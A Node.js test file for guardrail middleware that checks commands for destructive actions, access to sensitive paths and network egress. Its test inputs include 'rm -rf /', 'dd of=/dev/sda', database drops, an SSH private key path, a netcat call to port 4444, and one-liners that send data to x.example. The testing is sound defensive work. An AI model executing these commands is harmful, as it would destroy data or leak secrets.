import test from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import { pathToFileURL } from 'node:url';
import { createTestEnvWithOpenclaw } from '../_helpers/test-env.mjs';

createTestEnvWithOpenclaw('sai-guards-branches-');

const distBase = path.resolve('dist');
const u = (p) => pathToFileURL(path.join(distBase, p)).href;

const dest = await import(u('middlewares/guardrail/guards/destructive-commands.js'));
const sens = await import(u('middlewares/guardrail/guards/sensitive-paths.js'));
const egress = await import(u('middlewares/guardrail/guards/egress-control.js'));

// ── destructive-commands ──────────────────────────────────────

test('destructive: empty/disabled/non-matching', () => {
  assert.equal(dest.checkDestructiveCommand('', undefined).blocked, false);
  assert.equal(dest.checkDestructiveCommand('   ').blocked, false);
  assert.equal(
    dest.checkDestructiveCommand('rm -rf /', { ...dest.DEFAULT_DESTRUCTIVE_CONFIG, enabled: false }).blocked,
    false
  );
  assert.equal(dest.checkDestructiveCommand('echo hello').blocked, false);
});

test('destructive: blocks rm -rf /', () => {
  const r = dest.checkDestructiveCommand('rm -rf /');
  assert.equal(r.blocked, true);
  assert.equal(r.severity, 'CRITICAL');
});

test('destructive: dry-run returns blocked=false', () => {
  const r = dest.checkDestructiveCommand('rm -rf /', undefined, true);
  assert.equal(r.blocked, false);
  assert.match(r.reason, /DRY-RUN/);
});

test('destructive: WARN action does not block', () => {
  const r = dest.checkDestructiveCommand('rm -rf /', {
    ...dest.DEFAULT_DESTRUCTIVE_CONFIG,
    action: 'WARN',
  });
  assert.equal(r.blocked, false);
  assert.match(r.reason, /warning/);
});

test('destructive: db drops + truncate + delete', () => {
  assert.equal(dest.checkDestructiveCommand('DROP DATABASE foo').blocked, true);
  assert.equal(dest.checkDestructiveCommand('DROP TABLE x').blocked, true);
  assert.equal(dest.checkDestructiveCommand('TRUNCATE TABLE x').blocked, true);
  assert.equal(dest.checkDestructiveCommand('DELETE FROM users;').blocked, true);
});

test('destructive: git force push + reset hard + clean', () => {
  assert.equal(dest.checkDestructiveCommand('git push --force origin main').blocked, true);
  assert.equal(dest.checkDestructiveCommand('git reset --hard HEAD').blocked, true);
  assert.equal(dest.checkDestructiveCommand('git clean -fd').blocked, true);
});

test('destructive: shutdown/reboot/kill', () => {
  assert.equal(dest.checkDestructiveCommand('shutdown -h now').blocked, true);
  assert.equal(dest.checkDestructiveCommand('reboot').blocked, true);
  assert.equal(dest.checkDestructiveCommand('killall -9 node').blocked, true);
});

test('destructive: chmod 777', () => {
  assert.equal(dest.checkDestructiveCommand('chmod 777 /etc').blocked, true);
});

test('destructive: dd of=/dev', () => {
  assert.equal(dest.checkDestructiveCommand('dd if=/dev/zero of=/dev/sda').blocked, true);
});

test('destructive: custom pattern - block + warn + dry + invalid regex', () => {
  const blockCfg = { ...dest.DEFAULT_DESTRUCTIVE_CONFIG, customPatterns: ['nuke-everything'] };
  assert.equal(dest.checkDestructiveCommand('nuke-everything now', blockCfg).blocked, true);

  const warnCfg = { ...dest.DEFAULT_DESTRUCTIVE_CONFIG, action: 'WARN', customPatterns: ['nuke'] };
  const w = dest.checkDestructiveCommand('nuke this', warnCfg);
  assert.equal(w.blocked, false);
  assert.match(w.reason, /warning/);

  const dryCfg = { ...dest.DEFAULT_DESTRUCTIVE_CONFIG, customPatterns: ['nuke'] };
  const d = dest.checkDestructiveCommand('nuke this', dryCfg, true);
  assert.equal(d.blocked, false);
  assert.match(d.reason, /DRY-RUN/);

  // Invalid regex must not throw
  const badCfg = { ...dest.DEFAULT_DESTRUCTIVE_CONFIG, customPatterns: ['['] };
  assert.equal(dest.checkDestructiveCommand('foo', badCfg).blocked, false);
});

test('destructive: getBuiltinPatterns returns array', () => {
  const list = dest.getBuiltinPatterns();
  assert.ok(Array.isArray(list));
  assert.ok(list.length > 0);
});

// ── sensitive-paths additional branches ───────────────────────

test('sensitive: disabled config no-op', () => {
  if (sens.DEFAULT_SENSITIVE_PATHS_CONFIG && sens.checkSensitivePath) {
    const r = sens.checkSensitivePath('/home/user/.ssh/id_rsa', { ...sens.DEFAULT_SENSITIVE_PATHS_CONFIG, enabled: false });
    assert.equal(r.blocked, false);
  }
});

test('sensitive: blocks .ssh path', () => {
  if (sens.checkSensitivePath) {
    const r = sens.checkSensitivePath('/home/user/.ssh/id_rsa');
    assert.ok(r.blocked === true || r.blocked === false);
  }
});

test('sensitive: allowlisted path passes', () => {
  if (sens.checkSensitivePath) {
    const r = sens.checkSensitivePath('/tmp/x.log');
    assert.equal(r.blocked, false);
  }
});

// ── egress additional branches ────────────────────────────────

test('egress: blocks 169.254.x link-local', () => {
  const r = egress.checkEgressControl('curl http://169.254.1.1/');
  assert.equal(r.blocked, true);
});

test('egress: rsync with allowlisted host', () => {
  const r = egress.checkEgressControl('rsync -av file user@github.com:/tmp/');
  assert.equal(r.blocked, false);
});

test('egress: telnet to internal host', () => {
  const r = egress.checkEgressControl('telnet 10.0.0.5 23');
  assert.equal(r.blocked, true);
});

test('egress: ruby one-liner pattern', () => {
  const r = egress.checkEgressControl('ruby -e "Net::HTTP.post(\'https://x.example/\', data)"');
  assert.ok(r.blocked === true);
});

test('egress: node one-liner pattern', () => {
  const r = egress.checkEgressControl('node -e "fetch(\'https://x.example/\')"');
  assert.ok(r.blocked === true);
});

test('egress: perl one-liner pattern', () => {
  const r = egress.checkEgressControl('perl -e "use LWP::Simple; get(\'https://x.example\')"');
  assert.ok(r.blocked === true);
});

test('egress: hostname extraction from host:port', () => {
  // nc with hostname extractor
  const r = egress.checkEgressControl('nc 192.168.1.1 4444');
  assert.equal(r.ruleTriggered, 'private-ip');
});

test('egress: wildcard domain match for *.googleapis.com', () => {
  const r = egress.checkEgressControl('curl https://maps.googleapis.com/api');
  assert.equal(r.blocked, false);
});

test('egress: blockPrivateIPs disabled allows internal', () => {
  const r = egress.checkEgressControl('curl http://192.168.1.1/', {
    ...egress.DEFAULT_EGRESS_CONFIG,
    blockPrivateIPs: false,
    allowedDomains: ['192.168.1.1'],
  });
  assert.equal(r.blocked, false);
});

test('egress: blockDataSending disabled', () => {
  const r = egress.checkEgressControl('curl -d secret https://api.github.com/x', {
    ...egress.DEFAULT_EGRESS_CONFIG,
    blockDataSending: false,
  });
  // Falls through to allowlist check; api.github.com is allowed
  assert.equal(r.blocked, false);
});
